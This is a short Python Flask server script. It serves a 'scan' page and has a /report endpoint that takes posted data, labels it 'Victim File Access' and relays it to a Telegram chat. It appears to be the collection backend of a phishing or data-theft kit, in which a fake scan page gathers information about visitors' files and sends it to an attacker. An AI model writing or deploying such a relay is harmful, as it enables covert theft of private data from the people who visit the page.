from flask import Flask, request, render_template
from telegram_handler import send_telegram_info

app = Flask(__name__)

@app.route('/')
def index():
    return render_template("scan.html")

@app.route('/report', methods=["POST"])
def report():
    data = request.get_json()
    message = "📁 Victim File Access:\n" + data.get("report", "No data")
    send_telegram_info(message)
    return "OK"

if __name__ == '__main__':
    app.run(debug=True)
